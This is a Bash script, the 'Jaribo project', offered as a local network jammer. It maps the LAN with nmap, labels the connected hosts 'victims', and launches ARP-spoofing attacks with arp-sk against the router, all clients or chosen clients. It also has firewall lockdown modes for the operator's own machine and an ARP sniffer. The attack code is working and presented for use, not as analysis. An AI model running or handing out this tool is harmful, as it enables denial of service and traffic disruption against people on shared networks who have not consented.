#!/bin/bash
# Launch this script with superuser permissions ('sudo bash script.sh' or 'sudo ./script.sh').
function modo_seguro(){

				clear
				echo " )------------------------------------------------------------------------------("
				echo " )---------------------------- ACCESSING SAFE MODE -----------------------------("
				echo " ) - - - - - ⌬ - - -  ISOLATING MACHINE FROM THE NETWORK  - - - - ⌬ - - - - - ("
				echo " )------------------------------------------------------------------------------("
				echo " )-------------- Conections active (out/in) over ports 80 and 443 --------------("
				echo " )------------------------------------------------------------------------------("
				echo ""

				iptables -F
				iptables -P FORWARD DROP
				iptables -P INPUT DROP
				iptables -P OUTPUT DROP

				iptables -A INPUT -p tcp --dport 80 -j ACCEPT
				iptables -A INPUT -p tcp --dport 443 -j ACCEPT

							iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
							iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

				arptables -F
				arptables -P INPUT DROP
				arptables -P OUTPUT ACCEPT

				echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

				echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

				sleep 2
				clear
}

function modo_defcon1(){

				clear
        echo " )------------------------------------------------------------------------------("
        echo " )--------------------------- STATING DEFCON 1 MODE ----------------------------("
				echo " ) - - - - - ⌬ - - - - ISOLATING HOST FROM THE NETWORK - - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )------------------------ Outgoing connections active -------------------------("
        echo " )------------------------------------------------------------------------------("
				echo ""

				iptables -F
				iptables -P FORWARD DROP
				iptables -P INPUT DROP
				iptables -P OUTPUT DROP

				arptables -F
        arptables -P INPUT DROP
        arptables -P OUTPUT ACCEPT

				echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

				echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

				sleep 2
				clear
}

function modo_abierto(){

				clear
        echo " )------------------------------------------------------------------------------("
        echo " )--------------------------- RESTORING CONNECTIONS ----------------------------("
				echo " ) - - - - - ⌬ - - -  ISOLATING MACHINE FROM THE NETWORK  - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )------------------ Outgoing and Ingoing connections active -------------------("
        echo " )------------------------------------------------------------------------------("
				echo ""

				iptables -F
				iptables -P FORWARD ACCEPT
				iptables -P INPUT ACCEPT
				iptables -P OUTPUT ACCEPT

				arptables -F
        arptables -P INPUT ACCEPT
        arptables -P OUTPUT ACCEPT

				echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

				echo ""
				echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

				sleep 2
				clear
}

function networkpanic(){

				clear
        echo " )------------------------------------------------------------------------------("
        echo " )----------------------- ACCESSING NETWORK PANIC MODE -------------------------("
				echo " ) - - - - - ⌬ - - -  ISOLATING MACHINE FROM THE NETWORK  - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )----------------------- CERRANDO TODAS LAS CONEXIONES ------------------------("
        echo " )------------------------------------------------------------------------------("
				echo ""

				iptables -F
				iptables -P FORWARD DROP
				iptables -P OUTPUT DROP
				iptables -P INPUT DROP

				arptables -F
        arptables -P INPUT DROP
        arptables -P OUTPUT DROP

				echo ""
				echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

				echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

				sleep 2
				clear
}

function configurador_inicial(){

				clear
				echo '      ⌬                ___  ____  _____  _  __  ⌬ '
        echo '                      |   || __ || ___ \(_)|  |    '
        echo '                      |   ||(__)|| |_/ / _ |  |__  ___ ⌬ '
        echo '               ⌬      |   || __ ||    / | ||  __ |/ _ \        ⌬'
        echo '                   __ /   || || || |\ \ | || (__)| (_)                 ⌬'
        echo '     ⌬            |_______||_||_|\_| \_\|_||_____|\___/           ⌬'

				echo "+) Welcome to the Jaribo project, a local network jammer.          | v0.23("
				echo " |------------------------------------------------------------------------|"
				echo " |--------- Type in the router's ip and the network mask     -------------|"
				echo " |------------------------------------------------------------------------|"
				echo "-)    Maybe this info could help you figure out which is the ip:          |"
				echo " |    `ifconfig | grep 'broadcast' | sed -e 's/^[ \t]*//'`"
				echo ""
				read red
				clear

        echo '     ⌬                 ___  ____  _____  _⌬ __     '
        echo '                 ⌬    |   || __ || ___ \(_)|  | ⌬  '
        echo '                      |   ||(__)|| |_/ / _ |  |__  ___   '
        echo '        ⌬             |   || __ ||    / | ||  __ |/ _ \               ⌬'
        echo '                   __ /   || || || |\ \ | || (__)| (_)      ⌬'
        echo '                  |_______||_||_|\_| \_\|_||_____|\___/   ⌬'

				echo "+) Welcome to the Jaribo project, a local network jammer           | v0.23("
				echo " )------------------------------------------------------------------------("
				echo " |-------------------- Type in the network interface  --------------------|"
				netstat -i
				echo ""

        netstat -i
        echo ""
        read ether

				clear
}


configurador_inicial #Acceso a la funcion de arriba.

while [ true ]
do
echo " --------------------------------------------------------------------------"
echo "+) Welcome to the Jaribo project, a local network jammer.          | v0.23("
echo " |------------------------------------------------------------------------|"
echo " |--------> Suppression terminals watching '$red' from '$ether'"
echo " |------------------------------------------------------------------------|"
echo " |- 0) Refresh connectiions.                                              |"
echo " |- 1) Show victims (clients connected to the network).                   |"
echo " |- 2) Attack the entire network.                                         |"
echo " |- 3) Empty network.                                                     |"
echo " |- 4) Attack a specific client.                                          |"
echo " |- 5) Reconfigurate network config and adapter.                          |"
echo " |- 6) Show variable values.                                              |"
echo " |-*7) Start safe mode.                                                   |"
echo " |-*8) Access DEFCON 1 mode.                                              |"
echo " |-*9) Access 'network panic' mode.                                       |"
echo " |-*10) Access open mode.                                                 |"
echo " |- 11) Show iptables and arptables.                                      |"
echo " |- 12) Show active attacks.                                              |"
echo " |------------------------------------------------------------------------|"
echo " |- Enter) Exit.                            Proyecto Jarius, Vers.'Orion' |"
echo " )------------------------------------------------------------------------("

 #Genera variables a usando los datos itroducidos

router=`echo $red | cut -d "/" -f 1`

if [ -e Usuarios_en_red.txt ]; # revisa si Usuarios_en_red.txt existe
	then
		mrouter=`cat Usuarios_en_red.txt | cut -d " " -f 3 | awk NR==1`
	else
		echo "!)--> Atención, ¡ lista de usuarios no detectada !"
fi

read opt

clear

if [ -z "$opt" ]
	then
		exit
fi

case $opt in #Empieza en case
0) #Actualiza la lista de Usuarios_en_Red

	echo "0)------------------------------UPDATING LISTS----------------------------------("
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	nmap -sP $red | grep "MAC" > Usuarios_en_red.txt #guarda las lineas de la salida del nmap que coinciden con la palara MAC
	echo "|    ---     ---      ---        LISTS UPDATED         ---     ---      ---     |"
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	echo "-)------------------------------------------------------------------------------("
	sleep 1
	clear
;;

1) #Muestra Uusarios_en_red

	echo "1)--------------------------- VICTIMS ------------------------------------("
	cat Usuarios_en_red.txt | nl -ba

;;

2) #Peta el router

	clear
	echo "2)--------------------⌬ SUPPRESSION OVER ROUTER ⌬ -----------------------("
	echo "⌬)---------------- FOCUSING TERMINAL AGAINST '$mrouter' ---------("
	xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mrouter &
	echo "i) Press enter to stop suppression."
	read
	killall arp-sk
;;

3) #Peta toda la red menos tu y el router - DE MOMENTO NO FUNSIONA

	echo "3)----------------- MASSIVE SUPPRESSION IN PROGRESS ----------------------("
	echo "⌬)------------------ STARTING SECONDARY TERMINALS -----------------------("
	echo "-)------------------------------------------------------------------------("
	for mac in `cat Usuarios_en_red.txt | grep "MAC" | cut -d " " -f 3`;
	do
		if [ "$mac" != "$mrouter" ];
			then
			xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac & PIDE=$!
			echo "⌬ > EXECUTING TERMINAL $PIDE > SUPPRESSING OVER $mac"
		fi
	done
	echo "-)------------------------------------------------------------------------("
	echo "i) Press enter to stop suppression."
	read
	killall arp-sk
;;

4) #Peta jaribo especifico

	clear
	echo "-)------------------------------------------------------------------------("
	cat Usuarios_en_red.txt | nl -ba
	echo "-)------------------------------------------------------------------------("
	echo "2) Select the victims, press enter to exit this mode. --------------------("
	macvic=""
	read macvic
	if [ -n "$macvic" ];  #si apreta intro vuelve al menú
		then
			clear
			echo ""
			for i in $macvic;
			do
				echo "-)------------------------------------------------------------------------("
				mac=`cat Usuarios_en_red.txt | cut -d " " -f 3 |awk NR==$i`
				xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac & PIDE=$!
				echo "⌬)-------------- DELEGATING TERMIANL $PIDE OVER '$mac' -------("
				echo "⌬) Victim name > (`cat Usuarios_en_red.txt | cut -d '(' -f 2 | awk NR==$i`"
				echo "-)------------------------------------------------------------------------("
				echo ""
			done
			echo "i) Press enter to stop the suppression."
			read
			killall arp-sk
			macvic=""
		else
			clear
	fi
;;

5) # llama a la funcion de reconfiguración

	clear
	configurador_inicial
;;

6) # Muestra los valores de las variables, se usa para identificar problemas de configuración u programación

	echo "6)------------------------------------------------------------------------("
	echo "| red     = '$red' --> used to identify the router's network and ip"
	echo "| ether   = '$ether' --> used to identify the output adapter"
	echo "| router  = '$router' --> used to identify the ip of the Router"
	echo "| mrouter = '$mrouter' --> used to identify the router's mac"
	echo "| ownmac  = '$ownmac' --> used to identify the client's mac"
	echo "| mac     = '$mac' --> used to identify the victim's mac"
;;

7)
	modo_seguro
;;

8)
	modo_defcon1
;;

9)
	networkpanic
;;

10)
	modo_abierto
;;

11)
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

;;

12)

	echo " |-----> Attack sniffer. "
	echo " |------------------------------------------------------------------------|"
	echo " |- 1) Start sniffing .                                                  |"
	echo " |- 2) Stop sniffing.                                                  |"
	echo " |------------------------------------------------------------------------|"

	read opt2
	if [ $opt2 -eq 2 ];
		then
			killall tcpdump
			clear
		else
			xterm -e tcpdump -ennqti $ether \( arp or icmp \) &
			clear
	fi
;;

esac #final del case


done #final del bucle

export ESAC_INITIAL_STATUS_CONSTANT=1
